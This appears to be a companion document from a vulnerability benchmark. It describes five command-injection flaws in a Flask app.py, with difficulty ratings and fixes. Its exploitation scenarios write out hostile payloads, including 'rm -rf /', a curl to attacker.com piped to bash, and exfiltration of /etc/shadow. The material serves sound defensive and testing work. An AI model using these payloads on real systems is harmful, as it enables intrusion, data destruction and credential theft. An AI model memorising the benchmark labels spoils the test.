# Security Companion Document: app.py

## Vulnerability: Direct Command Injection via os.popen in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L16  

### Description
The `ping_host` function constructs a shell command by directly concatenating the user-supplied `host` query parameter into a string passed to `os.popen()`. The `host` value from `request.args.get("host", "")` is appended to the command string without any sanitization or validation.

### Exploitation Scenario
An attacker sends `GET /api/ping?host=127.0.0.1;cat /etc/passwd`. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning the contents of the password file. More destructive payloads such as `; rm -rf /` or `; curl attacker.com/shell.sh | bash` could achieve remote code execution.

### Remediation Guidance
Use `subprocess.run` with a list of arguments to avoid shell interpretation:
```python
result = subprocess.run(["ping", "-c", "3", host], capture_output=True, text=True, timeout=10)
```
Additionally, validate the `host` parameter against a hostname/IP regex pattern.

### Complexity Rationale
This is rated Obvious because user input flows directly from the request parameter into `os.popen()` with string concatenation, a textbook command injection pattern with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `os.popen()` with string concatenation is a well-known dangerous pattern that all major SAST tools flag reliably.

---

## Vulnerability: Shell Command Injection via subprocess in DNS Lookup Helper

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L36-L38  

### Description
The `run_dns_query` helper function constructs a shell command using `str.format()` to embed the `domain` parameter into a `dig` command string, then executes it via `subprocess.Popen` with `shell=True`. Although the `record_type` is validated against an allowlist in the calling function, the `domain` parameter is passed through without sanitization.

### Exploitation Scenario
An attacker sends `GET /api/dns/lookup?domain=example.com;id`. The `domain` value is interpolated into the shell command as `dig A example.com;id +short`, causing the shell to execute both `dig` and `id`. The attacker can chain arbitrary commands after the semicolon to exfiltrate data or establish persistence.

### Remediation Guidance
Use `subprocess.run` with argument lists to avoid shell interpretation:
```python
def run_dns_query(domain, record_type):
    result = subprocess.run(["dig", record_type, domain, "+short"],
                            capture_output=True, text=True, timeout=10)
    return result.stdout.strip()
```

### Complexity Rationale
This is rated Moderate because the vulnerability is split across two functions: `dns_lookup` validates the record type and calls `run_dns_query`, which performs the unsafe command construction. A reviewer must trace the data flow through the helper function to identify that the domain parameter is unvalidated.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need interprocedural analysis to track the taint from `request.args` through the `dns_lookup` function into `run_dns_query` and into the `subprocess.Popen` call with `shell=True`.

---

## Vulnerability: Command Injection via os.system in Archive Helper

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L52-L53  

### Description
The `compress_path` helper function constructs a shell command using `str.format()` to embed the `filepath` parameter into a `tar` command, then executes it via `os.system()`. While the `archive_name` parameter undergoes basic sanitization (replacing `/` and `\` with `_`), the `filepath` parameter from the JSON request body is embedded directly without any validation.

### Exploitation Scenario
An attacker sends `POST /api/files/archive` with body `{"path": "/tmp/data; curl attacker.com/exfil?data=$(cat /etc/shadow)", "name": "backup"}`. The `filepath` value is interpolated into the `tar` command, and the shell executes the injected `curl` command, exfiltrating sensitive system files to the attacker's server.

### Remediation Guidance
Use `subprocess.run` with argument lists:
```python
def compress_path(filepath, archive_name):
    sanitized_name = archive_name.replace("/", "_").replace("\\", "_")
    archive_path = "/tmp/{}.tar.gz".format(sanitized_name)
    subprocess.run(["tar", "czf", archive_path, filepath], timeout=30)
    return archive_path
```

### Complexity Rationale
This is rated Moderate because the vulnerability is in a helper function called from the route handler, and the adjacent `archive_name` parameter has partial sanitization that may create a false sense of security. A reviewer must recognize that `filepath` bypasses the sanitization applied to `archive_name`.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the taint flows from `request.get_json()` through the route handler into the helper function. Tools need to track JSON body parameters through function calls and recognize `os.system()` as a sink.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L68-L69  

### Description
The `search_logs` function constructs a shell pipeline command using `str.format()` that embeds three user-controlled parameters: `lines`, `log_path` (derived from `logfile`), and `keyword`. All three are interpolated into a `tail | grep` pipeline and executed via `subprocess.Popen` with `shell=True`. The `keyword` parameter is wrapped in single quotes, but this provides no real protection against injection since an attacker can break out of the quotes.

### Exploitation Scenario
An attacker sends `GET /api/logs/search?keyword=error'%3B%20id%20%23&file=syslog&lines=100`. The single quote in the keyword breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest. Alternatively, the `lines` parameter can be exploited: `GET /api/logs/search?keyword=test&lines=100 /etc/passwd; cat /etc/shadow #` injects commands through the numeric parameter that has no validation.

### Remediation Guidance
Use `subprocess.run` with argument lists and avoid shell pipelines:
```python
tail_result = subprocess.run(["tail", "-n", lines, log_path],
                             capture_output=True, text=True, timeout=15)
grep_result = subprocess.run(["grep", keyword],
                             input=tail_result.stdout, capture_output=True, text=True)
```

### Complexity Rationale
This is rated Nuanced because three separate user-controlled parameters are injected into a single shell pipeline, and the single-quote wrapping around the keyword creates a false appearance of sanitization. A reviewer must recognize that all three parameters are attack vectors and that the quoting is insufficient.

### Detection Difficulty Rationale
This is rated Likely_Missed because the multiple injection points within a shell pipeline, combined with the pseudo-sanitization of single quotes, make this difficult for SAST tools to fully analyze. Tools may flag the `shell=True` usage but miss the specific multi-parameter injection vectors.

---

## Vulnerability: Command Injection via Shell Execution in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L100-L101  

### Description
The `check_port` function constructs a shell command using `str.format()` to embed the `host` and `port` parameters into a `nc` (netcat) command, then executes it via `subprocess.Popen` with `shell=True`. While the `port` parameter undergoes integer validation, the `host` parameter from the JSON request body is embedded directly without sanitization.

### Exploitation Scenario
An attacker sends `POST /api/network/check` with body `{"host": "127.0.0.1; whoami", "port": 80}`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`. The attacker can chain arbitrary commands to achieve remote code execution.

### Remediation Guidance
Use `subprocess.run` with argument lists:
```python
cmd = ["nc", "-zv", "-w", "3", host, str(port)]
proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
```
Additionally, validate the `host` parameter against a hostname/IP pattern.

### Complexity Rationale
This is rated Obvious because user input from the JSON body flows directly into a shell command via string formatting with `shell=True`, a straightforward command injection pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from request body to `subprocess.Popen` with `shell=True` and string formatting is a standard pattern that SAST tools detect reliably.
